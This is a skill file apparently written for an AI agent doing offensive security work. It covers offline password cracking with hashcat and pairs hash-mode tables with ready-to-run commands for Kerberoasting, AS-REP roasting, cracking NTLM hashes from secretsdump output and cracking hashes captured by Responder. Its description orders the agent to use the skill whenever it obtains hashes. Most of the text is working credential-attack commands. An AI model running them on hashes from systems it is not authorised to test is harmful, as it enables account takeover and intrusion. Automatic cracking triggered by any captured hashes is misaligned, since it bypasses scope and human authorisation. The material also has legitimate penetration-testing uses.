---
name: hashcat-crack
description: "Offline password hash cracking with hashcat. Use when you have obtained password hashes (NTLM/NTLMv2/Kerberos TGS/AS-REP/SHA/MD5/bcrypt/NetNTLMv2) and need to recover the plaintext password. hashcat is a GPU-accelerated password cracking tool, tens of times faster than john. Covers hash type identification, dictionary attacks, rule attacks, mask attacks, and combination attacks. Must use this skill after obtaining hashdump/secretsdump/Kerberoast/AS-REP output"
zh-signals: "使用 hashcat 对密码哈希进行 GPU 加速离线破解，覆盖类型识别、字典/规则/掩码攻击。信号:hashcat,哈希破解,GPU破解,NTLM,Kerberoast"
when-to-use: >-
  Use when you have captured password hashes such as NTLM, NetNTLMv2, Kerberos TGS/AS-REP,
  or bcrypt and need to recover plaintext offline.
metadata:
  tags: "hashcat,crack,hash,password,ntlm,kerberos,tgs,md5,sha,password,cracking,GPU,john,hash"
  category: "tool"
---

# hashcat Offline Password Hash Cracking

hashcat uses GPU acceleration to crack hashes, far faster than a CPU. Core workflow: **identify the hash type → choose the attack mode → feed it wordlists/rules/masks**.

## Hash Type Identification (-m parameter)

| Hash Type | -m Value | Source |
|----------|-------|------|
| NTLM | 1000 | hashdump / secretsdump |
| NetNTLMv1 | 5500 | Responder capture (legacy systems/downgrade attacks) |
| NetNTLMv2 | 5600 | Responder / ntlmrelayx capture |
| Kerberos TGS (Kerberoast) | 13100 | GetUserSPNs.py |
| Kerberos AS-REP | 18200 | GetNPUsers.py |
| MD5 | 0 | Web database leak |
| SHA-256 | 1400 | — |
| Raw SHA-512 | 1700 | 128-character hexadecimal digest |
| sha512crypt ($6$) | 1800 | Linux /etc/shadow |
| bcrypt | 3200 | Web application |
| DCC2 (Domain Cached Credentials 2) | 2100 | secretsdump domain cached credentials |
| WPA-PBKDF2 | 22000 | WiFi handshake capture |

## Attack Modes

### Dictionary Attack (Most Common)

```bash
# Basic dictionary attack
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (mutated wordlists, e.g. password → Password1!)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Common rule files
# best64.rule — 64 efficient rules, balanced for speed and effectiveness
# rockyou-30000.rule — large rule set, covers more mutations
# OneRuleToRuleThemAll.rule — the strongest community rule set
```

### Mask Attack (Known Password Pattern)

```bash
# 8 digits only
hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d?d?d?d?d

# Capitalized first letter + 6 lowercase letters + 1 digit (e.g. Password1)
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?l?d

# Mask character sets: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all
```

### Combination Attack

```bash
# Combine two wordlists (word1+word2)
hashcat -m 1000 hashes.txt -a 1 dict1.txt dict2.txt
```

## Practical Scenarios

### Kerberoast Cracking

```bash
# GetUserSPNs.py output → hashcat
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### AS-REP Roasting Cracking

```bash
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip DC_IP -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### NTLM Hash Cracking (hashdump/secretsdump)

```bash
# secretsdump output format: user:RID:LM:NTLM:::
# Extract the NTLM portion
cat secretsdump.txt | awk -F: '{print $4}' | sort -u > ntlm.txt
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### NetNTLMv2 Cracking (captured by Responder)

```bash
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Useful Parameters

```bash
# Show already cracked results
hashcat -m 1000 hashes.txt --show

# Resume an interrupted task
hashcat -m 1000 hashes.txt --restore

# Run GPU only (no CPU)
hashcat -m 1000 hashes.txt -D 2

# Set the workload (1=low 2=default 3=high 4=extreme)
hashcat -m 1000 hashes.txt -w 3

# Kernel optimization (truncate the password length for speed, enough for most scenarios)
hashcat -m 1000 hashes.txt -O

# Output to file
hashcat -m 1000 hashes.txt wordlist.txt -o cracked.txt
```

## Decision Tree

```
After obtaining the hashes:
├─ Known hash type → use the hashcat -m value directly
├─ Unsure of the type → hashcat --identify hashes.txt or hashid
├─ GPU available → hashcat (preferred)
├─ No GPU / CPU environment → john the ripper
└─ Online lookup → hashes.org / crackstation.net (try before running)
```
